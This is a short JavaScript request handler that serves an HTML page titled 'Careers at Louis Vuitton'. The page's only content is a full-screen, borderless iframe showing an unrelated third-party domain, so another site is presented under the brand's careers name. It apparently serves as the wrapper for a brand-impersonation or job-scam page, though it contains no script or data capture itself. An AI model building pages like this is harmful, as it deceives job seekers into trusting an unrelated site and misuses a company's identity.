export default function handler(req, res) {
    res.setHeader("Content-Type", "text/html; charset=utf-8");

    res.status(200).send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRN9IzdEemoZmhMlr5-EVw7JOFWcUdrihA5A&s">
<title>Careers at Louis Vuitton</title>

<style>
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
  }

  iframe {
    width: 100%;
    height: 100vh;
    border: none;
    display: block;
  }
</style>
</head>

<body>

<iframe
  src="https://myforeverrose.co.nz"
  loading="lazy"
  allowfullscreen>
</iframe>
</body>
</html>`);
}
